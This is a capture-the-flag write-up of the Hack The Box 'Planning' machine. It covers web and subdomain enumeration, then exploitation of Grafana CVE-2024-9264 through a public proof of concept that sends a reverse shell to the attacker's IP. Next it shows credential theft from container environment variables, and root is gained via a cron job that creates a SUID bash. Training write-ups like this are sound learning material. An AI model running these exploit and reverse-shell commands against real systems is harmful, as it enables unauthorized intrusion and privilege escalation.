# Port scan
```
nmap -sC -sV -Pn 10.10.11.68 -oN ./nmap.txt

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
```
Very normal structure of web service.

# Page check 
`planning.htb`
![](images/Pasted%20image%2020250710163644.png)
From the index page of `planning.htb`, I did not find anything interesting here.

Then I would continue to fuzz the valid web contents
```
ffuf -u http://planning.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt

                        [Status: 200, Size: 23914, Words: 8236, Lines: 421, Duration: 373ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 358ms]
img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 343ms]
index.php               [Status: 200, Size: 23914, Words: 8236, Lines: 421, Duration: 452ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 342ms]
lib                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 359ms]
:: Progress: [4614/4614] :: Job [1/1] :: 82 req/sec :: Duration: [0:00:54] :: Errors: 0 ::

```

Still nothing interesting here.

So I would continue to check the sub-domain of this service.
```
ffuf -u http://planning.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.planning.htb" -fs 178

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 98ms]
```
Then we get the target `grafana.planning.htb` and add it to our `/etc/hosts`

`grafana.planning.htb`
![](images/Pasted%20image%2020250710164911.png)
From the Machine Information from the description, we get the credit
```
Machine Information

As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r
```

![](images/Pasted%20image%2020250710165205.png)
By pressing the help button, we can get the version of Grafana service
`Grafana v11.0.0 (83b9528bce)`

# CVE-2024-9264
Then by searching on google, we can find something interesting here
![](images/Pasted%20image%2020250710165436.png)
The links from github are here 
```
https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit
CVE-2024-9264-RCE-Exploit in Grafana via SQL Expressions

https://github.com/nollium/CVE-2024-9264
Grafana Post-Auth DuckDB SQL Injection (RCE, File Read)
```
They both direct to the sql injection.

Let's download one of the poc script and exploit them.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Planning/CVE-2024-9264-RCE-Exploit]
└─$ python3 poc.py -h                                                                             
usage: poc.py [-h] --url URL --username USERNAME --password PASSWORD --reverse-ip REVERSE_IP --reverse-port REVERSE_PORT

Authenticate to Grafana and create a reverse shell payload

options:
  -h, --help            show this help message and exit
  --url URL             Grafana URL (e.g., http://127.0.0.1:3000)
  --username USERNAME   Grafana username
  --password PASSWORD   Grafana password
  --reverse-ip REVERSE_IP
                        Reverse shell IP address
  --reverse-port REVERSE_PORT
                        Reverse shell port



┌──(wither㉿localhost)-[~/Templates/htb-labs/Planning/CVE-2024-9264-RCE-Exploit]
└─$ python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.16 --reverse-port 443
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 443
```

Then we can successfully get the reverse shell as root
```
nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.68] 57654
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# pwd
/usr/share/grafana
```

I think we are in the docker environment, so we have to escape from docker.
Let's check the env values
```
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
OLDPWD=/usr/share/grafana/bin
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=enc
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana
```
Here we go, we find the important information
```
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
```

Before we have know the port 22 open, so let's try to ssh connect it.
![](images/Pasted%20image%2020250710170544.png)
We successfully get it, and the user.txt is in the directory of enzo.

# Root
I would firstly check `sudo -l`
```
enzo@planning:~$ sudo -l
[sudo] password for enzo: 
Sorry, user enzo may not run sudo on planning.
```
Unluckily, there is nothing.

Then I would continue to check the valid services of ports
```
enzo@planning:~$ netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:45871         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -      
```
By verifying them one by one, I found port 3000 and 8000 looks interesting
```
enzo@planning:~$ curl 127.0.0.1:8000
enzo@planning:~$ curl 127.0.0.1:3000
<a href="/login">Found</a>.

```

let's port forwarding them to our local machine
`ssh enzo@planning.htb -L 8000:localhost:8000`
`http://127.0.0.1:8000`
![](images/Pasted%20image%2020250710171134.png)
But I did not have any credit here, so let's enumerate the file systems of enzo.
![](images/Pasted%20image%2020250710171403.png)
Then we can get something interesting from `crontab.db`
```
enzo@planning:/opt/crontabs$ cat crontab.db| jq
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}

```
So the credit would be `root_grafana:P4ssw0rdS0pRi0T3c`
By try to pass the auth, I found `root_grafana:P4ssw0rdS0pRi0T3c` is the right one.
![](images/Pasted%20image%2020250710171650.png)
There is a crontab dashboard service here.

There is a cleanup script in the root directory, that means this service mostly possible run the command by root user.
So let's make a payload and get the root shell.
`cp /bin/bash /tmp/bash && chmod u+s /tmp/bash` and run it .
Then we can find it did work.
![](images/Pasted%20image%2020250710172044.png)
Run it with root `/tmp/bash -p`
Finally we get the root shell now.


# Description
This is a very simple machine, and each step is easy to see and think of. There is even a direct exploit script to get a shell in one click.
This is a very simple machine, and each step is easy to see and think of. There is even a direct exploit script to get a shell in one click.